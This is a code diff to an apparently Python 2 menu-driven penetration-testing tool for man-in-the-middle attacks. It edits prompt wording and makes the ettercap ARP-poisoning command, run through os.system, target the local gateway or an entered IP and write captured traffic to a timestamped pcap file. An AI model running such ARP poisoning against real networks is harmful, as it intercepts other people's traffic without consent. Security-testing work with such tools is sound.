@@ -96,6 +96,7 @@ ___________                                                __
                                    '6) sslstrip off\n'
                                    '7) ettercap\n'
                                    '8) tcpdump\n'
+                                   # '9) Test Lab MIM\n'
                                    '9) stop all MITM attacks\n\n\n'
                                    '\033[1;32mYour Selection >>\033[1;m')
                 if mimopt == '1':
@@ -1013,9 +1014,9 @@ def mim_iptables():
                               '2) view current rules\n\n\n'
                               '\033[1;32mYour Selection >>\033[1;m')
         if table_tgl == '1':
-            print 'default 777'
+            print 'default listening port 777'
             print 'press Enter for default\n'
-            prtf = raw_input('\033[1;32mWhich port? >>\033[1;m')
+            prtf = raw_input('\033[1;32mWhich port? >>\033[1;m ')
             if prtf == 'back':
                 break
             elif prtf == '':
@@ -1096,7 +1097,8 @@ def mim_ettercap():
                             '\033[1;32mYour Selection >>\033[1;m')
         if ett_opt == '1':
             print '\033[1;31mRunning the following command: \033[1;m'
-            print 'ettercap -T -q -M ARP /192.168.1.1/// -w /root/demo.pcap >/dev/null 2>&1 &\n'
+            print 'ettercap -T -q -M ARP /{0}/// -w {1}/{2}.pcap >/dev/null 2>&1 &'\
+                .format(get_local_gateway(), expanduser('~'), ptime.strftime("%s"))
             print '-T (text only GUI)'
             print '-q (quiet mode - packet verbosity off)'
             print '-M (method)'
@@ -1111,6 +1113,9 @@ def mim_ettercap():
                 ett_ip = raw_input('\033[1;32mEnter the IP:\033[1;m')
                 break
             print 'Poisoning {0}'.format(ett_ip)
+            print '\033[1;31mRunning the following command: \033[1;m'
+            print 'ettercap -T -q -M ARP /{0}/// -w {1}/{2}.pcap >/dev/null 2>&1 &'\
+                .format(ett_ip, expanduser('~'), ptime.strftime("%s"))
             os.system('ettercap -T -q -M ARP /{0}/// -w {1}/{2}.pcap >/dev/null 2>&1 &'
                       .format(ett_ip, expanduser('~'), ptime.strftime("%s")))
         elif ett_opt == '3':
